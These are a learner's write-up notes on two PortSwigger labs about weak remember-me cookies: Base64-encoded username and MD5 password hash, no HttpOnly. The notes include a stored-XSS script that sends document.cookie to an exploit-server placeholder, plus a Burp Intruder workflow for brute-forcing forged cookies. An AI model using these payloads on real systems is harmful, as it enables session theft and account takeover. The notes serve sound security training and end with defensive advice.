# A04:2025 - Cryptographic Failures: Labs and Practice

## Purpose

This file documents the practical work completed for A04:2025 - Cryptographic Failures.

The goal was not only to solve two labs, but to understand why weak token design, weak hashing and browser-readable cookies can create real account takeover risk.

## Completed Practice

### Lab 1: PortSwigger - Offline Password Cracking

**Platform:** PortSwigger Web Security Academy  
**Lab:** Offline password cracking  
**Category:** A04:2025 - Cryptographic Failures  
**Related topics:** XSS, cookie security, weak remember-me token design  
**Status:** Completed after guided review

External link:

- https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking

### What I Practised

I logged in as the normal user and inspected the request in Burp Suite.

The request contained a persistent login cookie:

```http
Cookie: session=<redacted-session>; stay-logged-in=<redacted-base64-value>
```

After Base64 decoding the `stay-logged-in` value, the cookie revealed a structure like:

```text
wiener:<md5-password-hash>
```

This showed that the cookie format was probably:

```text
Base64(username:MD5(password))
```

This was the first important lesson:

> Base64 is not encryption. It is only encoding.

### What Was Vulnerable

The remember-me cookie was weak because it contained a predictable password-derived value.

The application did not issue a random, server-side validated token. Instead, the cookie contained:

```text
username + MD5(password)
```

This allowed the value to be decoded, understood and attacked offline.

### The Vulnerability Chain

This lab was valuable because it was not a single-step issue. It was a chain:

```text
Weak remember-me cookie design
    -> Base64(username:MD5(password))
    -> cookie readable by JavaScript because HttpOnly was missing
    -> stored XSS in a blog comment
    -> victim browser sent document.cookie to the exploit server
    -> attacker decoded victim's stay-logged-in cookie
    -> attacker cracked the MD5 hash offline
    -> attacker logged in as the victim
```

### Important Cookie Observation

The `stay-logged-in` cookie did not have the `HttpOnly` flag.

That mattered because JavaScript could read it through:

```js
document.cookie
```

This made the cookie stealable through stored XSS.

### Exploit Server Debugging

During the lab, I initially struggled because the exploit server log did not show the expected cookie value.

I tested the payload in smaller steps.

First, I confirmed that the stored XSS executed by sending a simple ping to the exploit server:

```html
<script>
new Image().src='https://<exploit-server>/exploit?ping=1';
</script>
```

Once the `/exploit?ping=1` request appeared in the access log, I knew that the XSS payload was executing.

Then I changed the payload to send `document.cookie`:

```html
<script>
new Image().src='https://<exploit-server>/exploit?cookie=' + encodeURIComponent(document.cookie);
</script>
```

The access log then showed a request from the victim browser containing the cookie value.

Sensitive values are intentionally redacted in these notes.

### What I Learned

- Base64 is reversible encoding, not encryption.
- MD5 is too fast and weak for password-related protection.
- A cookie containing `username:MD5(password)` is predictable and unsafe.
- Missing `HttpOnly` can turn XSS into cookie theft.
- Stored XSS can be used to exfiltrate browser-readable cookies.
- A weak remember-me token can lead to offline cracking and account takeover.

---

### Lab 2: PortSwigger - Brute-forcing a Stay-Logged-In Cookie

**Platform:** PortSwigger Web Security Academy  
**Lab:** Brute-forcing a stay-logged-in cookie  
**Category:** A04:2025 - Cryptographic Failures  
**Related topics:** Burp Intruder, weak token generation, MD5, Base64  
**Status:** Completed after guided review

External link:

- https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie

### What I Practised

The second lab used the same weak cookie design pattern:

```text
stay-logged-in = Base64(username:MD5(password))
```

This time, I did not need to steal the victim's cookie.

Because I knew the format, I could generate candidate cookies for the victim username:

```text
Base64(carlos:MD5(candidate-password))
```

I used Burp Intruder to transform a password list into valid candidate cookie values.

## Burp Intruder Workflow: MD5 + Prefix + Base64

This was one of the most useful practical parts of the lab.

### Goal

Generate many candidate cookies in this format:

```text
Base64(carlos:MD5(candidate-password))
```

### 1. Prepare the Request

I sent a request like this to Burp Intruder:

```http
GET /my-account?id=carlos HTTP/2
Host: <lab-host>
Cookie: stay-logged-in=PLACEHOLDER
```

I removed the normal `session` cookie so that the request would rely only on the `stay-logged-in` cookie.

### 2. Set Payload Position

In Burp Intruder, I selected only the cookie value:

```http
Cookie: stay-logged-in=§PLACEHOLDER§
```

### 3. Add Password Wordlist

The payload list contained candidate passwords.

Example structure:

```text
<password-1>
<password-2>
<password-3>
```

### 4. Add Payload Processing Rules

For each candidate password, Intruder transformed the payload like this:

```text
candidate password
    -> MD5(candidate password)
    -> add prefix: carlos:
    -> Base64 encode final value
```

The Burp payload processing rules were:

```text
1. Hash: MD5
2. Add prefix: carlos:
3. Encode: Base64
```

Example with redacted values:

```text
<candidate-password>
    -> <md5-hash>
    -> carlos:<md5-hash>
    -> <base64-cookie-value>
```

### 5. Identify the Successful Response

In the Intruder results, I compared:

- status code,
- response length,
- response body.

The successful request returned the account page for Carlos:

```html
<p>Your username is: carlos</p>
```

This showed that the generated remember-me cookie was accepted by the application.

### What I Learned

I had not used Burp Intruder payload processing this way before.

This lab helped me understand that Intruder can do more than replace a value with a wordlist. It can transform each payload before sending it.

In this case, each password was transformed into:

```text
Base64(username:MD5(password))
```

That worked only because the application's token design was predictable.

## Difference Between the Two Labs

### Lab 1: Offline Password Cracking

Lab 1 was a larger vulnerability chain:

```text
weak remember-me cookie
+ missing HttpOnly
+ stored XSS
+ cookie exfiltration
+ offline cracking
+ account takeover
```

### Lab 2: Brute-Forcing a Stay-Logged-In Cookie

Lab 2 focused more directly on weak token design:

```text
known cookie format
+ MD5 password hash
+ Base64 encoding
+ Burp Intruder payload processing
+ generated valid cookie
+ account access
```

Both labs map well to A04 because the core issue was weak cryptographic/token design.

## What I Struggled With

During these labs, I had several practical questions:

- Does Burp have Base64 encode/decode?
- What does the decoded cookie value actually mean?
- Is the hash based on the username or the password?
- Why is Base64 not encryption?
- Why does `HttpOnly=false` matter?
- Why did the exploit server log not show the cookie at first?
- Should the exploit URL include `/exploit`?
- How do I use Burp Intruder to hash each payload with MD5 and then Base64 encode it?

This was useful because it forced me to debug the chain step by step instead of only copying a final payload.

## Key Takeaways

1. Base64 is encoding, not encryption.
2. MD5 is weak and too fast for password-related protection.
3. A remember-me cookie should not contain `username:passwordHash`.
4. Missing `HttpOnly` makes cookies readable to JavaScript.
5. XSS can turn a browser-readable cookie into account takeover.
6. Burp Intruder can transform payloads using hashing, prefixes and encoding.
7. Secure remember-me tokens should be random, high-entropy, server-side validated, expiring and revocable.

## Related Notes

- [Authentication Bypass / Username Enumeration](../../key-web-vulnerabilities/01-authentication-bypass-username-enumeration/README.md)
- [Cross-Site Scripting](../../key-web-vulnerabilities/03-cross-site-scripting-xss/README.md)
- [CSRF + SameSite Cookies](../../key-web-vulnerabilities/05-csrf-samesite-cookies/README.md)
- [HTTP, Request/Response and Auth Basics](../../fundamentals/01-http-request-response-auth.md)
- [Burp Suite Proxy and Repeater](../../fundamentals/02-burp-suite-proxy-repeater.md)
